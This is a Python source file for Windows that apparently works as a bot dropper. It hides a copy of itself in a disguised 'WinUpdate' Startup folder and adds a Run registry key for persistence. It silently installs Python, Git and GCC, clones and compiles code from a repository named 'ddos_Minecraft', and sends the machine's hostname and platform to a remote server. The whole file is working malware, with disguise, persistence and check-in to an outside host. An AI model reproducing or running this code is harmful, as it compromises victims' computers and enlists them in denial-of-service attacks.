import os
import shutil
import subprocess
import sys
import time
import winreg
import urllib.request
import socket
from getpass import getuser

SERVER_IP = 's7.serv00.com'
SERVER_PORT = 63098
PYTHON_INSTALLER_URL = "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe"
PYTHON_INSTALLER = "python_installer.exe"
GIT_REPO = "https://github.com/glitch0099/ddos_Minecraft.git"
C_FILE = "l.c"
COMPILED_BINARY = "l"
LOCK_FILE = "connection.lock"

def run_silent(cmd, cwd=None):
    try:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW, shell=True, cwd=cwd,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def run_visible(cmd, cwd=None):
    try:
        subprocess.Popen(cmd, cwd=cwd, creationflags=subprocess.CREATE_NEW_CONSOLE)
    except:
        pass

def hide_file(path):
    subprocess.call(['attrib', '+H', path])

def move_to_startup():
    user = getuser()
    startup_path = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    hidden_folder = os.path.join(startup_path, "WinUpdate")

    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        hide_file(hidden_folder)

    current_script = os.path.abspath(sys.argv[0])
    target = os.path.join(hidden_folder, "winservice.py")

    # If script is not already in hidden_folder, copy it there, hide, and rerun from that location
    if current_script.lower() != target.lower():
        if not os.path.exists(target):
            shutil.copy2(current_script, target)
            hide_file(target)
        run_silent(["python", target], cwd=hidden_folder)
        time.sleep(2)
        try:
            os.remove(current_script)
        except:
            pass
        sys.exit(0)

    return hidden_folder

def add_to_registry(exe_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def install_python_silent():
    if not shutil.which("python"):
        urllib.request.urlretrieve(PYTHON_INSTALLER_URL, PYTHON_INSTALLER)
        run_silent([PYTHON_INSTALLER, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
        try:
            os.remove(PYTHON_INSTALLER)
        except:
            pass

def install_dependencies():
    run_silent(["python", "-m", "ensurepip", "--upgrade"])
    run_silent(["python", "-m", "pip", "install", "--upgrade", "pip"])
    # Install GitPython, psutil, pycryptodome quietly
    run_silent(["python", "-m", "pip", "install", "gitpython", "psutil", "pycryptodome", "--quiet"])

def install_system_packages():
    # Ensure we have Git, GCC, etc., installed if winget is available.
    # The -e, --source, and -y flags might differ based on your winget version.
    # If your system doesn't have winget, these calls won't succeed silently.
    run_silent(["winget", "install", "--id=Microsoft.OpenJDK.11", "--accept-source-agreements", "--accept-package-agreements"])
    run_silent(["winget", "install", "pip"])
    run_silent(["winget", "install", "Git.Git", "-e", "--source=winget", "-y"])
    run_silent(["winget", "install", "gcc"])

def git_clone_silent(repo_url, dest):
    # If git is not installed in PATH, the clone won't work
    # We rely on 'winget install Git.Git' having succeeded
    if not os.path.exists(dest):
        run_silent(["git", "clone", repo_url, dest])

def compile_c_silent(c_path, output, cwd=None):
    if os.path.exists(c_path):
        run_silent(["gcc", c_path, "-o", output, "-lpthread"], cwd=cwd)

def connect_to_server(hidden_folder):
    lock_file = os.path.join(hidden_folder, LOCK_FILE)
    # Only connect once; if lock_file exists, don't connect again
    if os.path.exists(lock_file):
        return

    try:
        with open(lock_file, "w") as f:
            f.write("connected")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
        hostname = socket.gethostname()
        os_info = sys.platform
        s.send(f"INFO {hostname} {os_info}".encode())
        s.close()
    except:
        pass

def main():
    hidden_folder = move_to_startup()
    add_to_registry(os.path.join(hidden_folder, "winservice.py"))
    install_python_silent()
    install_dependencies()
    install_system_packages()

    repo_path = os.path.join(hidden_folder, "ddos_Minecraft")
    git_clone_silent(GIT_REPO, repo_path)

    c_file_path = os.path.join(repo_path, C_FILE)
    out_file_path = os.path.join(repo_path, COMPILED_BINARY)
    compile_c_silent(c_file_path, out_file_path, cwd=repo_path)

    # Open a visible cmd window in the ddos_Minecraft directory
    run_visible(["cmd"], cwd=repo_path)

    # Connect just once to the server
    connect_to_server(hidden_folder)

if __name__ == "__main__":
    main()
